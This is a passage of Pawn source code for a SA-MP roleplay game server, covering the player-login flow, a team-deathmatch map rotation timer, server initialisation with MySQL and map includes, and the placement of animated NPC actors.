		if( PlayerInfo[ playerid ][ xLevel ] >= 10 && PlayerInfo[ playerid ][ xSlotoviVozila ] < 3 )
		{
			PlayerInfo[ playerid ][ xSlotoviVozila ]++;
			SCMF( playerid, ZUTA, "(VOZILO): Dobili ste dodatni slot vozila jer ste presli level 10. Sada imate {FFFFFF}(%d).", PlayerInfo[ playerid ][ xSlotoviVozila ] );

			sql_user_update_integer( playerid, "vehicle_slots", PlayerInfo[ playerid ][ xSlotoviVozila ] );
		}
	}
	PlayerLogged[ playerid ] = true;
	sql_user_update_integer( playerid, "isonline", 1 );

	SMG_SetSpawnInfo( playerid );
    SpawnPlayer( playerid );
    TogglePlayerSpectating( playerid, false );

	BuildIngameTextDraws(playerid, true);

	SetPlayerVirtualWorld( playerid, 0 );
	SMG_SetPlayerColor( playerid );
	ResetPlayerWeapons( playerid );

	new str[ 22 ];
	GetPlayerIp( playerid, str, 22 );
	DodajWarnRed("~g~(CONNECT - %s(%d)): ~w~Level: ~g~%d ~w~| IP: ~g~%s", ImeIgraca( playerid ), playerid, PlayerInfo[ playerid ][ xLevel ], str );
	sql_user_update_string(playerid, "user_ip", str);

	if(PlayerInfo[playerid][xAdmin] != 0)
	{
		AdminDialog[playerid] = true;
	    ShowPlayerDialog(playerid, dialog_ADMINCODE, DIALOG_STYLE_INPUT, "{FFFFFF}Admin Code:", "{FFFFFF}Vi ste Administrator na nasem serveru.\nMolimo upisite vas code kako biste mogli nastaviti sa normalnom igrom.", "Potvrdi", "Izadji");
	}

	StopAudioStreamForPlayer(playerid);
	return 1;
}

stringtoUpperCase( str[] )
{
	new string[64];
	format( string, sizeof( string ), "%s", str );
    for( new i = 0; i < sizeof( string ); i++ )
	{
        toupper( string[ i ] );
    }
    return string;
}

_:public internetcaffe_tdm()
{
    tdm_ServerMap = random( sizeof( tdm_mapInfo ) );
    mTimer = SetTimerEx_("PromenaMape", 15*60000, 15*60000, 1, "i", tdm_ServerMap);

    tdm_mapInfo[ tdm_ServerMap ][ mMinut ] = 1;
	tdm_mapInfo[ tdm_ServerMap ][ mSekunda ] = 0;
    mOstaloVreme = SetTimerEx_("VremeDoPromene", 1000, 1000, -1, "i", tdm_ServerMap);

	TextDrawSetString( TDM_gTD[ 17 ], "~b~score:_000" );
	TextDrawSetString( TDM_gTD[ 19 ], "~r~score:_000" );

	TextDrawSetString( TDM_gTD[ 18 ], "~b~players:_00" );
	TextDrawSetString( TDM_gTD[ 20 ], "~r~players:_00" );
}

_:public VremeDoPromene( mapa )
{
    tdm_mapInfo[ mapa ][ mSekunda ]++;
    if( tdm_mapInfo[ mapa ][ mSekunda ] == 60 ) tdm_mapInfo[ mapa ][ mMinut ]++, tdm_mapInfo[ mapa ][ mSekunda ] = 0;

	new tdm_str[50];
    format( tdm_str, sizeof( tdm_str ), "%s - %s%d:%s%d", tdm_mapInfo[ mapa ][ mName ],
			((15*60000/60000 - tdm_mapInfo[ mapa ][ mMinut ]) < 10 ) ? ("0") : (""), (15*60000/60000 - tdm_mapInfo[ mapa ][ mMinut ]),
		    ((15*60000/15000 - tdm_mapInfo[ mapa ][ mSekunda ]) < 10 ) ? ("0") : (""), (15*60000/15000 - tdm_mapInfo[ mapa ][ mSekunda ]) );

	TextDrawSetString( TDM_gTD[ 14 ], tdm_str );
    return 1;
}

_:public PromenaMape( mapa )
{
	KillTimer(mTimer);
	tdm_mapInfo[ mapa ][ mMinut ] = 1;
	tdm_mapInfo[ mapa ][ mSekunda ] = 0;
    KillTimer(mOstaloVreme);

	tdm_ServerMap = random( sizeof( tdm_mapInfo ) );
	if( tdm_ServerMap == mapa ) tdm_ServerMap = random( sizeof( tdm_mapInfo ) );
	tdm_mapInfo[ tdm_ServerMap ][ ctScore ] = 0;
	tdm_mapInfo[ tdm_ServerMap ][ ttScore ] = 0;

	send_tdm_message( 0xFFAF00FF, "(CS-TDM): Promena mape." ); 
	send_tdm_message( 0xFFAF00FF, "(CS-TDM): Sledeca mapa: {FFFFFF}%s", tdm_mapInfo[ tdm_ServerMap ][ mName ] );

	new tdm_str[ 20 ];
	format( tdm_str, sizeof( tdm_str ), "~b~score:_%03d", tdm_mapInfo[ tdm_ServerMap ][ ctScore ] );
	TextDrawSetString( TDM_gTD[ 17 ], tdm_str );
	format( tdm_str, sizeof( tdm_str ), "~r~score:_%03d", tdm_mapInfo[ tdm_ServerMap ][ ttScore ] );
	TextDrawSetString( TDM_gTD[ 19 ], tdm_str );

	format( tdm_str, sizeof( tdm_str ), "~b~players:_%02d", tdm_mapInfo[ tdm_ServerMap ][ ctPlayers ] );
	TextDrawSetString( TDM_gTD[ 18 ], tdm_str );
	format( tdm_str, sizeof( tdm_str ), "~r~players:_%02d", tdm_mapInfo[ tdm_ServerMap ][ ttPlayers ] );
	TextDrawSetString( TDM_gTD[ 20 ], tdm_str );

	foreach( new i : Player)
	{
	    if( tdm_player_info[ i ][ tdm_Team ] != 0 )
		{
			tdm_player_info[ i ][ tdm_Kill ] = 0;
			tdm_player_info[ i ][ tdm_KillinaROW ] = 0;
			tdm_player_info[ i ][ tdm_Death ] = 0;

			SMG_SetSpawnInfo( i );
			SpawnPlayer( i );
		}
	}

	mTimer = SetTimerEx_("PromenaMape", 15*60000, 15*60000, 1, "i", tdm_ServerMap);

	tdm_mapInfo[ tdm_ServerMap ][ mMinut ] = 1;
	tdm_mapInfo[ tdm_ServerMap ][ mSekunda ] = 0;
    mOstaloVreme = SetTimerEx_("VremeDoPromene", 1000, 1000, -1, "i", tdm_ServerMap);
}

opstinaObjectsBig(id) {
    switch(id) { 
        case 19377, 19381, 19692, 19325, 19380, 19462, 2934, 18762: 
        return true;
    }
    return false;
}

opstinaObjectsSmall(id) {
    switch(id) {
        case 19433, 18763, 19369, 638, 2257, 1499, 626, 1726, 1727: 
        return true;
    }
    return false;
}

OpstinaObjectOptimized(objid, Float:x, Float:y, Float:z, Float:rx, Float:ry, Float:rz, worldid = -1, interiorid = -1, playerid = -1, Float:streamdistance = 300.0, Float:drawdistance = 300.0, areaid = -1, priority = 0) {
    if(opstinaObjectsBig(objid)) {
        streamdistance = 600.0;
        drawdistance = 600.0;
        priority = 3;
        worldid = 2;
        interiorid = 2;
    }
    else if(opstinaObjectsSmall(objid)) {
        streamdistance = 450.0;
        drawdistance = 450.0;
        priority = 2;
        worldid = 2;
        interiorid = 2;
    }
    else {
        priority = 1;
        worldid = 2;
        interiorid = 2;
    }
    return CreateDynamicObject(objid, x, y, z, rx, ry, rz, worldid, interiorid, playerid, streamdistance, drawdistance, areaid, priority);
}

RegRoomObject(objid, Float:x, Float:y, Float:z, Float:rx, Float:ry, Float:rz, worldid = -1, interiorid = -1, playerid = -1, Float:streamdistance = 300.0, Float:drawdistance = 300.0, areaid = -1, priority = 0) {
    z += 900.00;
    return CreateDynamicObject(objid, x, y, z, rx, ry, rz, worldid, interiorid, playerid, streamdistance, drawdistance, areaid, priority);
}

#if ZIMSKI_MOD == 1
snow_CreateDynamicObject(modelid, Float:x, Float:y, Float:z, Float:rx, Float:ry, Float:rz, vw, int, pid, Float:streamdistance = 300.0, Float:drawdistance = 300.0)
{
	new object = CreateDynamicObject(modelid, x + 0.05, y + 0.075, z + 0.1, rx, ry, rz, vw, int, pid, streamdistance, drawdistance);
	for(new a = 0; a < 15; a++) SetDynamicObjectMaterial(object, a, 3922, "bistro", "mottled_grey_64HV", 0x00000000); //SetDynamicObjectMaterial(object, a, 17944, "lngblok_lae2", "white64bumpy", 0);
	return object;
}
#endif

//------------------------------------------------------------------------------

public OnGameModeInit()
{
	print(" ");

	SetGameModeText(VERZIJA_MODA" - "MODE_BUILD"");
	SendRconCommand("language "CLIENT_LANGUAGE"");

	//

	Streamer_VisibleItems(STREAMER_TYPE_OBJECT, MAX_OBJECTS);
	Streamer_VisibleItems(STREAMER_TYPE_PICKUP, MAX_PICKUPS);
	Streamer_VisibleItems(STREAMER_TYPE_3D_TEXT_LABEL, MAX_3DTEXT_GLOBAL);
	Streamer_VisibleItems(STREAMER_TYPE_ACTOR, MAX_ACTORS);

	Streamer_SetTickRate(100);
	Streamer_SetChunkSize(STREAMER_TYPE_OBJECT, 200);

	new types[STREAMER_MAX_TYPES] =
    {
        STREAMER_TYPE_OBJECT,
        STREAMER_TYPE_ACTOR,
        STREAMER_TYPE_AREA,
        STREAMER_TYPE_3D_TEXT_LABEL,
        STREAMER_TYPE_PICKUP,
        STREAMER_TYPE_MAP_ICON,
        STREAMER_TYPE_CP,
        STREAMER_TYPE_RACE_CP
    };
    Streamer_SetTypePriority(types, sizeof(types));

	//

	Mysql_Connect();
	mysql_log(LOG_ERROR | LOG_WARNING);

	//

	adds = gettime();

	//

	ServerInfo[ PaketPoceo ] = false;
	ServerInfo[ PaketID ] = -1;
	ServerInfo[ PaketNijeNaSvomMestu ] = false;
	ServerInfo[ PaketStvari ][ 0 ] = 0;
    ServerInfo[ PaketStvari ][ 1 ] = 0;
	KillTimer(ServerInfo[ PaketTimer ]);

	//

	EnableStuntBonusForAll( 0 );
	DisableInteriorEnterExits( );
	ManualVehicleEngineAndLights( );
    AllowInteriorWeapons( 1 );
    ShowPlayerMarkers( false );

	//

	new tmpobjid, map_world, map_int;
	
    #include maps\Bases_Create
    #include maps\Business_Create
    #include maps\Event_Create
    #include maps\Jobs_Create
    #include maps\Main_Locations_Create
    #include maps\Factions_Create
    #include maps\Other_Locations_Create
    #include maps\Houses_Create

    #if XMAS_MOD == 1

    	#include maps\XMasEdition

	#endif

	#if ZIMSKI_MOD == 1

		#include maps\WinterEdition

	#endif

	//

	ServerInfo[ Prognozasys ] = 6;
	SetWeather( 6 );

	//

    LoadScriptfiles();
    CreateDefaultMapIcons();
    CreateTextDraws();
    CreateActors();
    DefineGatesAndDoors();
    CreatePickupsAnd3Ds();
	internetcaffe_tdm();
	AntiDeAMX();

    //

    ServerInfo[ HangarPaket ] = 1;

	if(IsValidDynamic3DTextLabel(ServerInfo[ SHangarLabel ])) DestroyDynamic3DTextLabel(ServerInfo[ SHangarLabel ]);

	new str[100];
	format( str, sizeof( str ), "(HANGAR[ORUZJE] - [%d/10])\nDa uzmete paket kucajte \"/uzmipaket\"", ServerInfo[ HangarPaket ] );
	ServerInfo[ SHangarLabel ] = CreateDynamic3DTextLabel( str, -1, 2410.2866,-2493.5195,13.6401, 20.0, IPI, IVI, 1, -1, -1 );

    ServerInfo[ SkladisteDroga ] = 35+random(20);
    NestoPljackano = gettime();

	if(IsValidDynamic3DTextLabel(ServerInfo[ SDrogaLabel ])) DestroyDynamic3DTextLabel(ServerInfo[ SDrogaLabel ]);

	format( str, sizeof( str ), "(HANGAR[DROGA] - [%d/500g])\nDa uzmete paket kucajte \"/uzmidrogu\"", ServerInfo[ SkladisteDroga ] );
    ServerInfo[ SDrogaLabel ] = CreateDynamic3DTextLabel( str, -1, 2411.4688,-2490.3281,13.6389, 10.0, IPI, IVI, 1, -1, -1 );

	//

	new year, month, day;
    getdate( year, month, day );
    gettimeEx(ghour, gminute, gsecond);
	FixHour(ghour);
	ghour = shifthour;
	
	#if ZIMSKI_MOD == 1

	        switch(ghour)
	        {
	        	case 0 .. 6:
	        	{
					SetWorldTime( 0 );
					ServerInfo[ VremeInGame ] = 0;
				}
	        	case 7 .. 9:
	        	{
					SetWorldTime( 8 );
					ServerInfo[ VremeInGame ] = 8;
				}
	        	case 10 .. 13:
	        	{
					SetWorldTime( 12 );
					ServerInfo[ VremeInGame ] = 12;
				}
	        	case 14 .. 16:
	        	{
					SetWorldTime( 15 );
					ServerInfo[ VremeInGame ] = 15;
				}
	        	case 17 .. 23:
	        	{
					SetWorldTime( 0 );
					ServerInfo[ VremeInGame ] = 0;
				}
			}

	#else

	        switch(ghour)
	        {
	        	case 0 .. 6:
	        	{
					SetWorldTime( 0 );
					ServerInfo[ VremeInGame ] = 0;
				}
	        	case 7 .. 9:
	        	{
					SetWorldTime( 8 );
					ServerInfo[ VremeInGame ] = 8;
				}
	        	case 10 .. 15:
	        	{
					SetWorldTime( 12 );
					ServerInfo[ VremeInGame ] = 12;
				}
	        	case 16 .. 20:
	        	{
					SetWorldTime( 18 );
					ServerInfo[ VremeInGame ] = 18;
				}
	        	case 21 .. 23:
	        	{
					SetWorldTime( 0 );
					ServerInfo[ VremeInGame ] = 0;
				}
			}

	#endif

	//

	bankSafe = CreateDynamicRectangle(1380.2906, 0.7959, 1394.6080, 6.0368, 96, 1, -1, 0);
    ZlataraSef = CreateDynamicRectangle(1723.0891, 1187.4453, 1743.5488, 1220.0171, 70, 70, -1, 0);
    //CreateDynamicRectangle(Float:minx, Float:miny, Float:maxx, Float:maxy, worldid = -1, interiorid = -1, playerid = -1, priority = 0)

    //

    Interiors[0] = CreateInterior("ZLATARA / DIJAMANT STORE",	2001.6296, -1279.6559, 23.9071, 		1710.0911,1235.8608,992.4035,183.7600, 		70, 0, 70, 0 );
	Interiors[1] = CreateInterior("OPSTINA", 					1487.4404, -1762.5168, 13.5684, 		-1840.0797, 2670.6033, 3.5884, 90.000, 		2, 0, 2, 0 );
    Interiors[2] = CreateInterior("AUTOSKOLA", 					2485.2683, -1907.2810, 13.5901, 		-233.8558, 2770.8398, -26.2796, 90.000,		3, 0, 3, 0 );
    Interiors[3] = CreateInterior("FABRIKA NAMJESTAJA", 		860.8141, -1255.7063, 14.7644, 			-2116.4507, 2753.7156, 13.3069, 90.000, 	4, 0, 4, 0 );
    //Interiors[4] = CreateInterior("LUXURION HOTEL", 			0.8141, -0.7063, 0.7644, 1392.6442,		-9.7199,1000.8685, 90.000, 					15, 0, 4, 0 );
    Interiors[5] = CreateInterior("IGRAONICA", 					1286.7953,-1308.4381,13.5501,			1293.4344,-1342.6139,35.8093, 2.8668, 		187, 0, 187, 0 );
    Interiors[6] = CreateInterior("FABRIKA MUNICIJE", 			860.8141,-1245.4420,14.7578, 			-13.8315,-276.3553,1532.9620,90.0490, 		6, 0, 6, 0 );

	//

    for(new askid = 1; askid < MAX_ASKQS; askid++)
    {
		askqList[ askid ][ askqSend ] = false;
		askqList[ askid ][ askqID ] = -1;

		strmid( askqList[ askid ][ askqOwner ], "None", 0, strlen( "None" ), 32 );
		strmid( askqList[ askid ][ askqQuestion ], "None", 0, strlen( "None" ), 128 );
	}

	//

	#if XMAS_MOD == 1
	
		Area_Grudvanje = CreateDynamicRectangle(1441.3375, -1720.6425, 1517.8627, -1604.0273, -1, -1, -1);
		Area_Klizaliste = CreateDynamicRectangle(1070.7766, -1841.0602, 1084.2472, -1783.5984, -1, -1, -1);

	#endif

	bankaSalter = CreateDynamicRectangle(1372.8837,-32.3594, 1374.2975,-28.6158, 96, 1, -1);

	//

	mysql_tquery(mSQL, "UPDATE `users` SET `isonline` = '0'");

	SetTimer_("RandomPoruke", 10000, 1, -1);
	SetTimer_("SyncTime", 60000, 1, -1);
	SetTimer_("StartKladRulet", 30000, 1, -1);

	//

	print("(U) "VERZIJA_MODA" by Saco x Ghetoven");
	print(" ");
	return 1;
}

public OnGameModeExit()
{
	SaveServerStats();

	foreach( new i : Player)
	{
		KillTimer(gZone_Timer[i]);
	    KillTimer(_progressatmbar[i]);

	    #if ZIMSKI_MOD == 1

	    	KillTimer(action_effect[i]);

	    #endif

		KillTimer(RentTimer[i]);
		KillTimer(DragTimer[i]);
		KillTimer(pocetni_intro[i]);
		KillTimer(tazovan_tajmer[i]);
		KillTimer(TrashTimer[i]);
		KillTimer(PilotTimer[i]);
		KillTimer(PljackanjeBankeTimer[i]);
		KillTimer(PljackanjeZlatareTimer[i]);
		KillTimer(rudarPosao[i][rudarTimer]);
	}
    mysql_close(mSQL);
	return 1;
}

CreateActors()
{
	// -- Misije
	//new actor_mission[2];

	// -- A/GM Baza
	new ST_Hoe;
    ST_Hoe = CreateDynamicActor(178, 4212.4883,3056.2681,4.1649,157.6537, true, 100.0, -1, -1, -1, 200.0, -1, 0);
    ApplyDynamicActorAnimation(ST_Hoe, "STRIP", "PUN_LOOP", 4.1, 1, 1, 1, 1, 1);

	//-- Event
	new actor_event[8];
	actor_event[0] = CreateDynamicActor(random(311)+1, 984.7178,2565.2817,10.7149,290.0369, 1, 100.0, 12001, -1, -1, 500.0, -1, 0);
	ApplyDynamicActorAnimation(actor_event[0], "GANGS", "hndshkaa", 4.0, 1, 1, 1, 0, -1);
	actor_event[1] = CreateDynamicActor(random(311)+1, 984.7659,2566.4258,10.6949,276.2501, 1, 100.0, 12001, -1, -1, 500.0, -1, 0);
	ApplyDynamicActorAnimation(actor_event[1], "PAULNMAC", "wank_loop", 1.5, 1, 1, 1, 0, -1);
	actor_event[2] = CreateDynamicActor(random(311)+1, 984.4760,2567.6963,10.6762,272.8034, 1, 100.0, 12001, -1, -1, 500.0, -1, 0);
	ApplyDynamicActorAnimation(actor_event[2], "CASINO", "cards_win", 4.0, 1, 1, 1, 0, -1);
	actor_event[3] = CreateDynamicActor(random(311)+1, 982.0994,2569.1553,10.6762,294.4236, 1, 100.0, 12001, -1, -1, 500.0, -1, 0);
	ApplyDynamicActorAnimation(actor_event[3], "CASINO", "Roulette_win", 4.0, 1, 1, 1, 0, -1);
	actor_event[4] = CreateDynamicActor(random(311)+1, 991.5046,2581.1785,10.7986,200.7359, 1, 100.0, 12001, -1, -1, 500.0, -1, 0);
	ApplyDynamicActorAnimation(actor_event[4], "GANGS", "smkcig_prtl", 4.0, 1, 1, 1, 0, -1);
	actor_event[5] = CreateDynamicActor(random(311)+1, 989.4453,2582.1497,10.7952,211.3894, 1, 100.0, 12001, -1, -1, 500.0, -1, 0);
	ApplyDynamicActorAnimation(actor_event[5], "RAPPING", "Laugh_01", 4.0, 1, 1, 1, 0, -1);
	actor_event[6] = CreateDynamicActor(random(311)+1, 993.4909,2581.7739,10.8203,213.8961, 1, 100.0, 12001, -1, -1, 500.0, -1, 0);
	ApplyDynamicActorAnimation(actor_event[6], "ON_LOOKERS", "wave_loop", 4.0, 1, 1, 1, 0, -1);
	actor_event[7] = CreateDynamicActor(random(311)+1, 985.6008,2585.6724,10.7945,199.7959, 1, 100.0, 12001, -1, -1, 500.0, -1, 0);
	ApplyDynamicActorAnimation(actor_event[7], "DEALER", "DEALER_DEAL", 4.0, 1, 1, 1, 0, -1);

	// -- Javna Kuca
	new actor_javnakuca[8];
	actor_javnakuca[0] = CreateDynamicActor(12, -2436.4424, 995.2935, -20.5350, 176.8919, 1, 100.0, -1, -1, -1, 100.0, -1, 0); //drolje
	actor_javnakuca[1] = CreateDynamicActor(40, -2436.6335, 1006.5629, -20.5350, 359.8802, 1, 100.0, -1, -1, -1, 100.0, -1, 0);
	actor_javnakuca[2] = CreateDynamicActor(55, -2448.6267, 1006.4838, -20.5350, 357.6869, 1, 100.0, -1, -1, -1, 100.0, -1, 0);
	actor_javnakuca[3] = CreateDynamicActor(64, -2448.4248, 996.1221, -20.5350, 180.0251, 1, 100.0, -1, -1, -1, 100.0, -1, 0);
	actor_javnakuca[4] = CreateDynamicActor(214, -2397.2646, 1000.3264, -20.4355, 274.2271, 1, 100.0, -1, -1, -1, 100.0, -1, 0); //konobarice
	actor_javnakuca[5] = CreateDynamicActor(214, -2400.5500, 1004.2144, -20.4355, 7.7475, 1, 100.0, -1, -1, -1, 100.0, -1, 0);
	actor_javnakuca[6] = CreateDynamicActor(214, -2404.1775, 1000.7347, -20.4355, 90.6983, 1, 100.0, -1, -1, -1, 100.0, -1, 0);
	actor_javnakuca[7] = CreateDynamicActor(214, -2400.6917, 997.1736, -20.4355, 176.6360, 1, 100.0, -1, -1, -1, 100.0, -1, 0);

	new actor_jkdancer[5];
	actor_jkdancer[0] = CreateDynamicActor(63, -2411.0474, 994.7935, -20.4423, 6.7633, 1, 100.0, -1, -1, -1, 100.0, -1, 0); //plesacice
	actor_jkdancer[1] = CreateDynamicActor(64, -2412.1418, 993.2431, -20.4423, 123.0319, 1, 100.0, -1, -1, -1, 100.0, -1, 0);
	actor_jkdancer[2] = CreateDynamicActor(152, -2391.5752, 993.4570, -20.4423, 116.0734, 1, 100.0, -1, -1, -1, 100.0, -1, 0);
	actor_jkdancer[3] = CreateDynamicActor(207, -2393.1602, 1023.3606, -20.3654, 123.7557, 1, 100.0, -1, -1, -1, 100.0, -1, 0);
	actor_jkdancer[4] = CreateDynamicActor(238, -2401.6619, 1022.3336, -20.3654, 90.2079, 1, 100.0, -1, -1, -1, 100.0, -1, 0);
	ApplyDynamicActorAnimation(actor_jkdancer[0], "STRIP", "strip_A", 4.0, 1, 1, 1, 1, 0);
	ApplyDynamicActorAnimation(actor_jkdancer[1], "STRIP", "strip_B", 4.0, 1, 1, 1, 1, 0);
	ApplyDynamicActorAnimation(actor_jkdancer[2], "STRIP", "strip_C", 4.0, 1, 1, 1, 1, 0);
	ApplyDynamicActorAnimation(actor_jkdancer[3], "STRIP", "strip_D", 4.0, 1, 1, 1, 1, 0);
	ApplyDynamicActorAnimation(actor_jkdancer[4], "STRIP", "strip_E", 4.0, 1, 1, 1, 1, 0);

	// -- Kladionica
	new actor_klad[4];
	CreateDynamicActor(11, 820.1868,2.3867,1004.1797,269.4225, 1, 100.0, -1, -1, -1, 100.0, -1, 0); //radnica
	actor_klad[0] = CreateDynamicActor(random(312), 827.9006,7.2557,1004.1870,30.9601, 1, 100.0, -1, -1, -1, 100.0, -1, 0); //actor 1
	actor_klad[1] = CreateDynamicActor(random(312), 830.9343,11.2867,1004.1797,348.9731, 1, 100.0, -1, -1, -1, 100.0, -1, 0); //actor 2
	actor_klad[2] = CreateDynamicActor(random(312), 830.6375,-0.2758,1004.1797,178.2049, 1, 100.0, -1, -1, -1, 100.0, -1, 0); //actor 3
	actor_klad[3] = CreateDynamicActor(random(312), 833.9276,-0.7113,1004.1797,231.7854, 1, 100.0, -1, -1, -1, 100.0, -1, 0); //actor 4
	ApplyDynamicActorAnimation(actor_klad[0], "WUZI", "Wuzi_Stand_Loop", 4.0, 1, 0, 0, 0, 0);
	ApplyDynamicActorAnimation(actor_klad[1], "GRAVEYARD", "mrnf_loop", 4.0, 1, 0, 0, 0, 0);
	ApplyDynamicActorAnimation(actor_klad[2], "CASINO", "Slot_win_out", 4.0, 1, 1, 1, 1, 0);
	ApplyDynamicActorAnimation(actor_klad[3], "CASINO", "Slot_bet_02", 4.0, 1, 1, 1, 1, 0);

	// -- Putarina
	new actor_putarina[2];
	actor_putarina[0] = CreateDynamicActor(280, 1749.2852,528.3046,32.8475,145.8058, 1, 100.0, -1, -1, -1, 200.0, -1, 0); //cuvar 1
	actor_putarina[1] = CreateDynamicActor(282, 1734.3860,534.8636,32.8475,319.8119, 1, 100.0, -1, -1, -1, 200.0, -1, 0); //cuvar 2
	ApplyDynamicActorAnimation(actor_putarina[0], "OTB", "wtchrace_loop", 4.0, 1, 0, 0, 0, 0);
	ApplyDynamicActorAnimation(actor_putarina[1], "POLICE", "CopTraf_come", 4.0, 1, 0, 0, 0, 0);

	// -- Banka
	new actor_bank[4];
	actor_bank[0] = CreateDynamicActor(1+random(311), 1479.1401,-1024.6998,23.8178,359.5154, 1, 100.0, -1, -1, -1, 200.0, -1, 0);
	actor_bank[1] = CreateDynamicActor(1+random(311), 1478.9854,-1023.5255,23.8291,178.5753, 1, 100.0, -1, -1, -1, 200.0, -1, 0);
	actor_bank[2] = CreateDynamicActor(1+random(311), 1459.0256,-1024.5337,23.8281,182.5037, 1, 100.0, -1, -1, -1, 200.0, -1, 0);
	actor_bank[3] = CreateDynamicActor(1+random(311), 1451.3209,-1027.8555,23.8281,359.1037, 1, 100.0, -1, -1, -1, 200.0, -1, 0);
	ApplyDynamicActorAnimation(actor_bank[0], "PED", "SEAT_idle", 2.0, 1, 0, 0, 0, 0);
	ApplyDynamicActorAnimation(actor_bank[1], "COP_AMBIENT", "Coplook_loop", 4.0, 1, 0, 0, 0, 0);
	ApplyDynamicActorAnimation(actor_bank[2], "SMOKING", "M_smkstnd_loop", 4.0, 1, 0, 0, 0, 0);
	ApplyDynamicActorAnimation(actor_bank[3], "GANGS", "Invite_No", 4.0, 1, 0, 0, 0, 0);

	// -- Opstina
	new actor_opstina[7];
	actor_opstina[0] = CreateDynamicActor(1+random(311), 1501.1152,-1750.4817,13.5479,359.1639, 1, 100.0, -1, -1, -1, 200.0, -1, 0);
	actor_opstina[1] = CreateDynamicActor(1+random(311), 1500.2953,-1752.7158,13.5679,177.7422, 1, 100.0, -1, -1, -1, 200.0, -1, 0);
	actor_opstina[2] = CreateDynamicActor(1+random(311), 1489.3414,-1742.0876,13.5469,358.5371, 1, 100.0, -1, -1, -1, 200.0, -1, 0);
	actor_opstina[3] = CreateDynamicActor(1+random(311), 1467.5563,-1745.0276,13.5679,359.3089, 1, 100.0, -1, -1, -1, 200.0, -1, 0);
	actor_opstina[4] = CreateDynamicActor(1+random(311), 1478.4958,-1759.5165,13.5679,237.4211, 1, 100.0, -1, -1, -1, 200.0, -1, 0);
	actor_opstina[5] = CreateDynamicActor(1+random(311), 1479.5110,-1760.0272,13.5679,53.2027, 1, 100.0, -1, -1, -1, 200.0, -1, 0);
	actor_opstina[6] = CreateDynamicActor(1+random(311), 1451.1309,-1738.6271,13.5469,191.9381, 1, 100.0, -1, -1, -1, 200.0, -1, 0);
	ApplyDynamicActorAnimation(actor_opstina[0], "PED", "SEAT_idle", 2.0, 1, 0, 0, 0, 0);
	ApplyDynamicActorAnimation(actor_opstina[1], "PED", "SEAT_idle", 2.0, 1, 0, 0, 0, 0);
	ApplyDynamicActorAnimation(actor_opstina[2], "SMOKING", "M_smklean_loop", 4.0, 1, 0, 0, 0, 0);
	ApplyDynamicActorAnimation(actor_opstina[3], "GANGS", "Invite_Yes", 4.1, 1, 0, 0, 0, 0);
	ApplyDynamicActorAnimation(actor_opstina[4], "MISC", "IDLE_CHAT_02", 2.0, 1, 0, 0, 0, 0);
	ApplyDynamicActorAnimation(actor_opstina[5], "COP_AMBIENT", "Coplook_loop", 4.0, 1, 0, 0, 0, 0);
	ApplyDynamicActorAnimation(actor_opstina[6], "GRAFFITI", "graffiti_Chkout", 4.0, 1, 0, 0, 0, 0);

	// -- Trg
	new actor_trg[4];
	actor_trg[0] = CreateDynamicActor(1+random(311), 1469.6488,-1713.5989,14.0469,269.8864, 1, 100.0, -1, -1, -1, 200.0, -1, 0);
	actor_trg[1] = CreateDynamicActor(1+random(311), 1488.2407,-1694.3590,14.0469,89.4046, 1, 100.0, -1, -1, -1, 200.0, -1, 0);
	actor_trg[2] = CreateDynamicActor(1+random(311), 1488.1310,-1693.2072,14.0469,89.4046, 1, 100.0, -1, -1, -1, 200.0, -1, 0);
	actor_trg[3] = CreateDynamicActor(1+random(311), 1470.3359,-1630.1667,14.0469,213.8715, 1, 100.0, -1, -1, -1, 200.0, -1, 0);
	//actor_trg[4] = CreateDynamicActor(1+random(311), 1510.3727,-1603.6378,14.8475,204.5670, 1, 100.0, -1, -1, -1, 200.0, -1, 0); //grudvanje
	//actor_trg[5] = CreateDynamicActor(1+random(311), 1513.6901,-1609.3405,15.4782,31.0020, 1, 100.0, -1, -1, -1, 200.0, -1, 0); //grudvanje
	ApplyDynamicActorAnimation(actor_trg[0], "PED", "SEAT_idle", 2.0, 1, 0, 0, 0, 0);
	ApplyDynamicActorAnimation(actor_trg[1], "PED", "SEAT_idle", 2.0, 1, 0, 0, 0, 0);
	ApplyDynamicActorAnimation(actor_trg[2], "MISC", "seat_talk_02", 4.0, 1, 0, 0, 0, 0);
	ApplyDynamicActorAnimation(actor_trg[3], "PED", "endchat_03", 8.0, 1, 0, 0, 0, 0);
	//ApplyDynamicActorAnimation(actor_trg[4], "GRENADE", "WEAPON_throw", 4.1, 1, 0, 0, 0, 0);
	//ApplyDynamicActorAnimation(actor_trg[5], "GRENADE", "WEAPON_throw", 4.1, 1, 0, 0, 0, 0);

	// -- PD
	new actor_pd[4];
	actor_pd[0] = CreateDynamicActor(1+random(311), 1537.5616,-1657.3773,13.5469,205.1936, 1, 100.0, -1, -1, -1, 200.0, -1, 0);
	actor_pd[1] = CreateDynamicActor(1+random(311), 1538.5723,-1658.8625,13.5469,30.6887, 1, 100.0, -1, -1, -1, 200.0, -1, 0);
	actor_pd[2] = CreateDynamicActor((random(2) == 1 ? 280 : 283), 1546.8044,-1680.9192,13.6078,123.4129, 1, 100.0, -1, -1, -1, 200.0, -1, 0);
	actor_pd[3] = CreateDynamicActor((random(2) == 1 ? 281 : 284), 1545.7268,-1681.8369,13.6116,312.9579, 1, 100.0, -1, -1, -1, 200.0, -1, 0);
	ApplyDynamicActorAnimation(actor_pd[0], "MISC", "IDLE_CHAT_02", 2.0, 1, 0, 0, 0, 0);
	ApplyDynamicActorAnimation(actor_pd[1], "BAR", "Barcustom_order", 3.0, 1, 0, 0, 0, 0);
	ApplyDynamicActorAnimation(actor_pd[2], "PED", "IDLE_CHAT", 2.0, 1, 0, 0, 0, 0);
	ApplyDynamicActorAnimation(actor_pd[3], "SMOKING", "M_smkstnd_loop", 4.0, 1, 0, 0, 0, 0);

	// -- Spawn
	new actor_spawn[9];
	actor_spawn[0] = CreateDynamicActor(1+random(311), 1572.4291,-2304.7703,13.3866,267.7786, 1, 100.0, -1, -1, -1, 200.0, -1, 0);
	actor_spawn[1] = CreateDynamicActor(1+random(311), 1572.0348,-2311.2061,13.8435,268.6229, 1, 100.0, -1, -1, -1, 200.0, -1, 0);
	actor_spawn[2] = CreateDynamicActor(1+random(311), 1580.2396,-2296.1926,13.3866,48.2025, 1, 100.0, -1, -1, -1, 200.0, -1, 0);
	actor_spawn[3] = CreateDynamicActor(1+random(311), 1579.2820,-2295.1753,13.3866,225.8408, 1, 100.0, -1, -1, -1, 200.0, -1, 0);
